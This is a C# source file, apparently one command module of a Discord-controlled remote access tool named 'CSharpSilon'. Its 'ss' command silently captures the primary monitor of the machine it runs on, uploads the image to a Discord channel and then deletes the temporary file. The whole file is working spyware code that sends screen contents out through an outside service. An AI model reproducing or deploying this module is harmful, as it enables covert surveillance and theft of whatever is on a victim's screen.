using System.Drawing;
using System.IO;
using Discord.Commands;
using System.Threading.Tasks;
using Discord;
using System.Windows.Forms;
using ImageFormat = System.Drawing.Imaging.ImageFormat;

namespace CSharpSilon.cmds
{
    public class Screenshot : ModuleBase<SocketCommandContext>
    {
        [Command("ss")]
        [Summary("Takes A Screenshot Of The User's Main Monitor.")]
        public async Task Screenie()
        {
            var filePath = Path.Combine(Path.GetTempPath(), "screenshot.png");

            CaptureScreenshot(filePath);

            var stream = new FileStream(filePath, FileMode.Open);
            await Context.Channel.SendFileAsync(new FileAttachment(stream, "screenshot.png"));

            stream.Close();
            File.Delete(filePath);
        }
        
        private void CaptureScreenshot(string filePath)
        {
            var screenBounds = Screen.PrimaryScreen.Bounds;
            using (var bitmap = new Bitmap(screenBounds.Width, screenBounds.Height))
            {
                using (var graphics = Graphics.FromImage(bitmap))
                {
                    graphics.CopyFromScreen(screenBounds.X, screenBounds.Y, 0, 0, screenBounds.Size);
                }
                bitmap.Save(filePath, ImageFormat.Png);
            }
        }
    }
}